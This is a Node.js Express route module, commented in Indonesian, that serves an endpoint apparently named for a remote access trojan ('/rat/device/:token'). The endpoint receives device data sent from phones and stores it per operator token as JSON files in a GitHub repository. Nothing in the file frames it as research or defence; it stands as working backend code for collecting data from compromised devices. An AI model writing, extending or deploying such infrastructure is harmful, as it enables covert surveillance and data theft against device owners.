module.exports = function(app) {
    const axios = require('axios');
    const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
    const GITHUB_USER = 'daffaadev';
    const GITHUB_REPO = 'api';

    app.get('/rat/device/:token', async (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');

        try {
            const { token } = req.params;
            const { q } = req.query;

            if (!token || !q) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            let deviceData;
            try {
                deviceData = JSON.parse(q);
            } catch (e) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            // 🔥 PAKE MODEL HP SEBAGAI NAMA FOLDER
            const deviceId = deviceData.model || deviceData.device || 'unknown';
            const filePath = `device/${token}/${deviceId}/info.json`;

            // CEK APAKAH TOKEN VALID (folder token ada)
            let tokenExists = false;
            try {
                await axios.get(
                    `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/device/${token}`,
                    {
                        headers: {
                            'Authorization': `token ${GITHUB_TOKEN}`,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    }
                );
                tokenExists = true;
            } catch (e) {
                tokenExists = false;
            }

            // ❌ KALO TOKEN GAK ADA → TOLAK
            if (!tokenExists) {
                return res.status(404).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            // ✅ CEK APAKAH DEVICE SUDAH ADA
            let currentSha = null;
            let fileExists = false;

            try {
                const checkRes = await axios.get(
                    `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                    {
                        headers: {
                            'Authorization': `token ${GITHUB_TOKEN}`,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    }
                );
                fileExists = true;
                currentSha = checkRes.data.sha;
            } catch (e) {
                fileExists = false;
            }

            // 🔥 FORMAT JSON
            const formattedJson = JSON.stringify(deviceData, null, 2);
            const contentBase64 = Buffer.from(formattedJson).toString('base64');

            // ✅ UPDATE ATAU CREATE DEVICE BARU
            await axios.put(
                `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                {
                    message: fileExists ? `Update ${deviceId}` : `Create ${deviceId}`,
                    content: contentBase64,
                    sha: currentSha || undefined
                },
                {
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                }
            );

            res.status(200).json({
                success: true,
                message: fileExists ? 'Device updated.' : 'New device created.',
                device: deviceId
            });

        } catch (error) {
            console.error('Error:', error.message);
            res.status(500).json({
                success: false,
                message: 'Invalid parameters.'
            });
        }
    });
};
